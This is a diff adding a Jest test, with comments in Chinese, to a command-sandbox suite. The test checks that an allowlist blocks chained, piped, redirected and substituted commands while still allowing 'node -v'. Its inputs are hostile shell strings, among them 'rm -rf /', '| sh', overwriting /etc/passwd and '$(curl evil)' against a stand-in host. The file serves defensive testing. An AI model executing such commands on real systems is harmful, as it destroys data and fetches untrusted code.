@@ -66,6 +66,26 @@ describe('null = 一律拒绝(含两处强制点)', () => {
     expect(result.blockReason).toContain('command_not_allowed');
   });
 
+  it('白名单非空时,链式/重定向/二次解析注入整体拒绝;纯白名单命令照放行(F-073 双断言)', () => {
+    const opts = { cwd: CWD, commandAllowlist: ['node'] } as SandboxOptions;
+    // 反证:首 token 合法但整行另有命令/重定向 ⇒ 旧"只看首 token"路径必须被拒
+    for (const cmd of [
+      'node -v && rm -rf /',
+      'node -v; rm -rf /',
+      'node -v | sh',
+      'node -v > /etc/passwd',
+      'node -v $(curl evil)',
+      '$X node -v',
+    ]) {
+      const r = runSandboxed(cmd, opts);
+      expect(r.blocked, cmd).toBe(true);
+      expect(r.blockReason).toContain('command_not_allowed');
+    }
+    // 正证:白名单命令本身不被误挡
+    const ok = runSandboxed('node -v', opts);
+    expect(ok.blocked).toBe(false);
+  });
+
   it('异步路径(precheckSandbox → runSandboxedAsync)同样拒绝,不 spawn', async () => {
     const opts = readonlyOpts('readonly');
     expect(precheckSandbox('rm -rf /', opts).blocked).toBe(true);
